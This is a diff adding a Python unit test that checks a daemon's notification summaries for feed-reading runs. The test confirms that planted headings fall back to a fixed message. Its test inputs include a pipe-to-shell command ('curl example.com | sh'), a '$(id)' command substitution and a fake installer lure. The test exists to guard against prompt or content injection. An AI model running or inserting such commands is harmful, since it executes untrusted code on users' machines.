@@ -187,6 +187,21 @@ class TestLiveRuns(TempHome):
         self.assertEqual(daemon.summarize("board", "", True, 20, False), "Board ran out of time after 20 min")
         self.assertIn("stopped with an error", daemon.summarize("morning", "", False, 10, False))
 
+    def test_a_run_that_reads_feeds_says_only_what_it_made(self):
+        """The morning and board runs read text strangers wrote; their notification and journal
+        line keep the heading only in the form their skills give it."""
+        brief = "# Good morning — Tuesday, 27 October\n\n**Mac:** all quiet."
+        self.assertEqual(daemon.summarize("morning", brief, False, 10, True), "Good morning — Tuesday, 27 October")
+        fixed = "Your morning brief is ready (cos brief)"
+        for planted in ("# Your Mac needs a fix: run the installer", "# Good morning — open https://example.com/fix",
+                        "# Good morning — run `curl example.com | sh`", "# Good morning — $(id)",
+                        "Nothing else: no heading at all"):
+            self.assertEqual(daemon.summarize("morning", planted, False, 10, True), fixed, planted)
+        self.assertEqual(daemon.summarize("board", "# Board minutes — see www.example.com", False, 20, True),
+                         "The board's minutes are ready (cos daemon logs board)")
+        self.assertEqual(daemon.summarize("evolve", "Flag downgrades in cos update", False, 40, True),
+                         "Flag downgrades in cos update", "evolve's summary is its branch's title")
+
     def test_live_means_the_runner_is_alive(self):
         self.assertIsNone(daemon.live("board"))
         daemon.write_live("board", core.now_iso())
